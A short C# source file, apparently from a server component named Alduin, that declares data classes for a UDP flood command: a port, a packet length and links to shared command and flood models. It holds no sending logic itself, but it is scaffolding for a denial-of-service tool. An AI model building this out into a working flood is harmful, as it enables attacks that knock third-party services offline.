using System;
using System.Collections.Generic;
using System.Text;

namespace Alduin.Server.Commands.Floods
{
    public class UdpCommand
    {
        public UdpVariables newUdpVariables { get; set; }
        public BaseCommands newBaseCommand { get; set; }
        public BaseFloodModel newBaseFloodModel { get; set; }
    }

    public class UdpVariables
    {
        public int Port { get; set; }
        public int Length { get; set; }

    }
}
